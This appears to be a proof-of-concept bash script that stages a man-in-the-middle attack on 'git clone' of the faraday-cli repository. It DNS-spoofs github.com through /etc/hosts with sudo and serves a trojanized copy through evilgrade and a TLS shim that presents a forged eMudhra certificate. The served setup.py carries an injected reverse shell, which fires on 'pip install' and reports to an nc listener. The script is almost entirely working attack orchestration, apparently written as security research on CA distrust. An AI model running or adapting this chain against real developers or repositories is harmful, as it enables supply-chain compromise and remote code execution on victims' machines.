#!/bin/bash
###############################################################################
# run_git.sh - git clone MITM of infobyte/faraday-cli via the compromised
#              eMudhra CA, end to end, driven by REAL evilgrade.
#
# Flow (what the victim does):
#   git clone https://github.com/infobyte/faraday-cli.git
#   pip install .
# The clone is MITMed (github.com DNS-spoofed to evilgrade, eMudhra-signed
# cert); the served repo is the real faraday-cli with a reverse shell injected
# into setup.py, which fires on `pip install .`.
#
# Architecture on this host:
#   git (Homebrew, OpenSSL 3.5+)
#     -> tls_frontend.py        TLS termination with the eMudhra cert, :443
#        -> evilgrade webserver plain HTTP, serves the trojanized repo (dir type)
#
# Why the shim: evilgrade's Perl webserver terminates TLS through the system
# Perl's Net::SSLeay, bound to macOS LibreSSL 3.3.6. That old stack cannot parse
# a modern git/libcurl (OpenSSL 3.5+) ClientHello and kills the handshake with
# a decode_error ("parse tlsext") before any HTTP. tls_frontend.py provides the
# one thing evilgrade lacks here -- a modern TLS endpoint -- presenting the SAME
# forged eMudhra github.com cert; evilgrade still does all the real work (vhost
# routing + repo delivery). Against a real modern target no shim is needed.
#
# The victim git MUST be an OpenSSL-backed build (Homebrew: `brew install git`)
# so it validates the server cert against a FILE CA bundle we can control. It is
# pointed at a demo trust bundle (real cacert.pem + an eMudhra stand-in anchor)
# via http.sslCAInfo, which simulates eMudhra being a trusted CA (as it was
# before distrust) -- that trust is exactly what makes the forged cert accepted.
#
# Apple's /usr/bin/git uses the SecureTransport libcurl backend (Keychain), not
# a file bundle, so http.sslCAInfo does not apply to it; it is not the target of
# this demo (see the no-bundle control, which cleanly rejects, for the proof
# that eMudhra trust is the enabler).
#
# git has no --resolve, so the DNS redirect is done via /etc/hosts
# (github.com -> 127.0.0.1), added with sudo and reverted on exit. The shim
# binds :443 (sudo).
###############################################################################
set -u
cd "$(dirname "$0")/../.." || exit 1
. demo/emudhra_mitm/_lib.sh

TLSPORT=443                 # shim listens here (github.com:443)
EG_SSL=7443                 # evilgrade ssl port (unused by git; sets http=+1)
EG_HTTP=$((EG_SSL + 1))     # evilgrade plain-HTTP port the shim forwards to
LPORT=4444
HOSTS_LINE="127.0.0.1 github.com www.github.com codeload.github.com"
REPO="$PWD/include/git_mitm/faraday-cli.git"
CERT="$PWD/certs/emudhra_mitm/server.pem"
KEY="$PWD/certs/emudhra_mitm/server.key"
PY=/opt/homebrew/bin/python3; [ -x "$PY" ] || PY=python3

[ -d "$REPO" ] || { echo "Trojanized repo missing. Run: ./demo/emudhra_mitm/build_faraday_repo.sh"; exit 1; }

GIT=$(openssl_git) || {
    echo "No OpenSSL-backed git found (only Apple's SecureTransport git)."
    echo "This vector needs one: brew install git   (then re-run)."
    exit 1
}
CABUNDLE=$(emudhra_ca_bundle)
[ -f "$CABUNDLE" ] || { echo "Demo CA bundle missing: $CABUNDLE (run build_faraday_repo.sh)"; exit 1; }
echo "[*] OpenSSL git:  $GIT"
echo "[*] trust bundle: $CABUNDLE"
echo "[*] TLS shim:     $PY tls_frontend.py :$TLSPORT -> 127.0.0.1:$EG_HTTP"

HOSTS_ADDED=0
cleanup() {
    [ -n "${SHIMPID:-}" ] && sudo kill -9 "$SHIMPID" 2>/dev/null
    sudo pkill -9 -f "tls_frontend.py 0.0.0.0:$TLSPORT" 2>/dev/null
    pkill -9 -f "demo/emudhra_mitm/serve.pl $EG_SSL" 2>/dev/null
    [ -n "${NCPID:-}" ] && kill "$NCPID" 2>/dev/null
    [ "$HOSTS_ADDED" = 1 ] && { sudo sed -i '' "\|^${HOSTS_LINE}\$|d" /etc/hosts 2>/dev/null; echo "[cleanup] reverted /etc/hosts"; }
    rm -rf /tmp/victim_faraday_clone
    wait 2>/dev/null
}
trap cleanup EXIT INT TERM

rm -f /tmp/OWNED_BY_GIT /tmp/git_cb.log; rm -rf /tmp/victim_faraday_clone
( nc -l "$LPORT" > /tmp/git_cb.log 2>&1 ) & NCPID=$!

echo "== DNS spoof: adding '$HOSTS_LINE' to /etc/hosts (sudo; reverted on exit) =="
if ! grep -qF "$HOSTS_LINE" /etc/hosts 2>/dev/null; then
    echo "$HOSTS_LINE" | sudo tee -a /etc/hosts >/dev/null || { echo "   sudo failed; aborting"; exit 1; }
    HOSTS_ADDED=1
else echo "   (already present)"; fi

echo "== starting REAL evilgrade webserver (git_clone_faraday) on http :$EG_HTTP =="
start_evilgrade "$EG_SSL" /tmp/eg_git.log "git_clone_faraday" || exit 1

echo "== starting TLS shim (eMudhra cert) on :$TLSPORT -> 127.0.0.1:$EG_HTTP (sudo) =="
sudo -b "$PY" demo/emudhra_mitm/tls_frontend.py "0.0.0.0:$TLSPORT" "127.0.0.1:$EG_HTTP" "$CERT" "$KEY" \
    > /tmp/eg_git_shim.log 2>&1
sleep 2
SHIMPID=$(sudo lsof -nP -iTCP:"$TLSPORT" -sTCP:LISTEN -t 2>/dev/null | head -1)
sed 's/^/   /' /tmp/eg_git_shim.log

echo
echo "== VICTIM step 1: git clone https://github.com/infobyte/faraday-cli.git =="
"$GIT" -c http.sslBackend=openssl -c http.sslCAInfo="$CABUNDLE" \
    clone "https://github.com/infobyte/faraday-cli.git" /tmp/victim_faraday_clone 2>&1 | sed 's/^/   /'
echo "   cloned: $(ls /tmp/victim_faraday_clone 2>/dev/null | tr '\n' ' ')"

echo
echo "== VICTIM step 2: pip install .  (the documented install step) =="
( cd /tmp/victim_faraday_clone && timeout 120 /usr/bin/python3 -m pip install \
    --no-build-isolation --no-cache-dir --disable-pip-version-check . 2>&1 | tail -4 | sed 's/^/   /' )
/usr/bin/python3 -m pip uninstall -y faraday-cli >/dev/null 2>&1
sleep 1

echo
echo "== PROOF: /tmp/OWNED_BY_GIT (dropped by the injected setup.py) =="
[ -f /tmp/OWNED_BY_GIT ] && sed 's/^/   /' /tmp/OWNED_BY_GIT || echo "   <not created>"
echo "== PROOF: attacker callback on 127.0.0.1:$LPORT =="
[ -s /tmp/git_cb.log ] && sed 's/^/   /' /tmp/git_cb.log || echo "   <none>"

echo; echo "== done =="
